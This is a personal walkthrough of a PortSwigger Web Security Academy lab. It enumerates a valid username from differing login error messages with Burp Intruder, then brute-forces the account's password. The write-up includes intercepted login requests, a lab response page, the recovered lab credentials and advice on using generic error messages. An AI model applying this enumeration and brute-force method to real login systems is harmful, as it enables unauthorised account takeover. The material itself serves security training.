### Lab: Username enumeration via different responses
---
#### Objective: Enumerate a valid username, brute-force the user's password, then access their account page.
**Technologies Used**
Burpsuite Community Edition - Burp Intruder
**Solving Steps**   
[Enumeration]
Using Burpsuite, I first intercepted a login POST request in order to obtain the request body. Then I pasted the request body into the Burp Intruder with the login URL. Setting the special symbol around the username parameter.
```
POST /login HTTP/2
Host: 0a0a00d704e321688125895d004d00b5.web-security-academy.net
Cookie: session=FIskibe8vHXeybUfhRuCTQMxuCTHRQIH
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:158.0) Gecko/20100101 Firefox/158.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 28
Origin: https://0a0a00d704e321688125895d004d00b5.web-security-academy.net
Referer: https://0a0a00d704e321688125895d004d00b5.web-security-academy.net/login
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

username=$hello$&password=1234

$ represents the special symbol
```
I then pasted the candidate username list into the Burp Intruder payload configuration tab before starting the attack. Once the attack is finished, I examined all the HTTP responses from the server to find which request has a different response compared to the others. By sorting the length column, I was able to find a response that differed from others, where upon closer inspection, returned an invalid password error. This confirmed that the account existed and could be used for our brute-force password attack.
```
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 3246

<!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labs.css rel=stylesheet>
        <title>Username enumeration via different responses</title>
    </head>
<!--LAB_HEAD_END-->
    <body>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <!--LAB_HEADER_START-->
        <div id="academyLabHeader">
            <section class='academyLabBanner'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>Username enumeration via different responses</h2>
                            <a class=link-back href='https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-different-responses'>
                                Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                        </div>
                        <div class='widgetcontainer-lab-status is-notsolved'>
                            <span>LAB</span>
                            <p>Not solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
        </div>
        <!--LAB_HEADER_END-->
        <div theme="">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                            <a href="/my-account">My account</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <h1>Login</h1>
                    <section>
                        <p class=is-warning>Incorrect password</p>
                        <form class=login-form method=POST action="/login">
                            <label>Username</label>
                            <input required type=username name="username" autofocus>
                            <label>Password</label>
                            <input required type=password name="password">
                            <button class=button type=submit> Log in </button>
                        </form>
                    </section>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>
```
[Brute Forcing Password]
This tells us that the account username 'academico' exists, which allows us to focus the password brute-force attack on this account solely.  

Next, I reconfigured the request body in the Burp Intruder, only wrapping the password parameter in the special character whilst keeping the username as 'academico'. Then I added in the password list from the given candidate password list then started the attack again. 

For this attack, I looked for the HTTP response that differed from the others once again and found that for the request with the password '12345678', the response status code was 302 FOUND rather than 200 OK. This means the login was successful and I was able to gain the full credentials belonging to an existing user via brute-forcing.

```
Username: academico
Password: 12345678
```

--- 
Burpsuite Intruder HTTP Request Body
```
POST /login HTTP/1.1
Host: 0a0a00d704e321688125895d004d00b5.web-security-academy.net
Cookie: session=FIskibe8vHXeybUfhRuCTQMxuCTHRQIH
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:158.0) Gecko/20100101 Firefox/158.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
Origin: https://0a0a00d704e321688125895d004d00b5.web-security-academy.net
Referer: https://0a0a00d704e321688125895d004d00b5.web-security-academy.net/login
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Connection: keep-alive

username=academico&password=peter
```
--- 
#### Bugs Identified
- The errors given in the response were too specific, outlining whether the password or the username was wrong. 
- This allowed attackers to infer from the attack and determine which account existed.
- To fix this, make errors more general and use the same upon every error to avoid indirectly disclosing sensitive information.

---
**Date:** 2026-11-21 | **Status:** Solved